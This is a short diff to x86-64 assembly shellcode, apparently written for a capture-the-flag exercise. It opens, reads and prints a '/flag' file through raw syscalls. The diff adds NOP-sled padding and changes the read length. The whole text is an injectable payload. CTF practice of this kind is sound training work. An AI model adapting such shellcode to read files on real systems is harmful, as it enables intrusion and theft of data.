@@ -2,6 +2,9 @@
 .intel_syntax noprefix
 
 _start:
+.rept 0x6ff
+    nop
+.endr
 
 open:
     lea rdi, [rip + binbash]
@@ -11,7 +14,7 @@ open:
 read:
     mov rdi, rax
     lea rsi, [rsp]
-    mov rdx, 0x1000
+    mov rdx, 1000
     mov rax, 0
     syscall
 write:
@@ -25,3 +28,6 @@ exit:
     syscall
 binbash:
     .string "/flag"
+.rept 0x6ff
+    nop
+.endr
